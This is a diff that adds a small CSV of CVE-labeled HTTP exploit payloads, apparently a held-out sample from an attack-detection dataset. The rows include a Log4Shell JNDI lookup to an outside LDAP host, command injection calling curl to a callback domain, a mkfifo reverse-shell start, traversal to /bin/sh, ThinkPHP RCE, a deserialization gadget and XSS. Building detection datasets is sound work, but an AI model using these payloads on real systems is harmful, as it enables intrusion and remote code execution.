@@ -1,0 +1,11 @@
+id,payload_clean,cve_labels,source,split_note
+27,"HEAD / HTTP/1.1 Host: redacted User-Agent: ${jNd${13%25f:-${13%27f:-i:}}ldap://178-79-190-52-i80.superr.buzz:1389/rmr} Accept: */* X-Api-Version: ${jNd${13%25f:-${13%27f:-i:}}ldap://178-79-190-52-i80.superr.buzz:1389/rmr}",CVE-2021-44228,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+44,"GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20ctrf45n5hmeh23etvt60q54ptj3pbes9a.oast.live HTTP/1.1 Host: redacted User-Agent: Mozilla/5.0 Accept-Encoding: gzip",CVE-2023-46805 CVE-2024-21887,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+57,"POST /api/users HTTP/1.1 Host: redacted Content-Type: application/xml <sorted-set> <string>foo</string> <dynamic-proxy> <interface>java.lang.Comparable</interface> <handler class=""java.beans.EventHandler""></handler> </dynamic-proxy> </sorted-set>",CVE-2023-43208,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+64,"GET /r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1 Host: redacted",CVE-2021-26710,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+81,"POST /cgi-bin/luci/;stok=/locale HTTP/1.1 Host: redacted Content-Type: application/x-www-form-urlencoded command=rm%20-rf%20/tmp/f;mkfifo%20/tmp/f",CVE-2023-1389,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+121,"GET /actuator/gateway/routes/hacktest HTTP/1.1 Host: redacted User-Agent: Mozilla/5.0",CVE-2022-22947,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+146,"GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1 Host: redacted User-Agent: curl/7.68.0",CVE-2021-42013,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+177,"GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di HTTP/1.1 Host: redacted",CVE-2022-22965,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+203,"GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id HTTP/1.1 Host: redacted",CVE-2018-20062,datacon_train_labeled_sample.csv,holdout_excluded_from_index
+244,"GET /vpn/../vpns/cfg/smb.conf HTTP/1.1 Host: redacted User-Agent: Mozilla/5.0",CVE-2019-19781,datacon_train_labeled_sample.csv,holdout_excluded_from_index
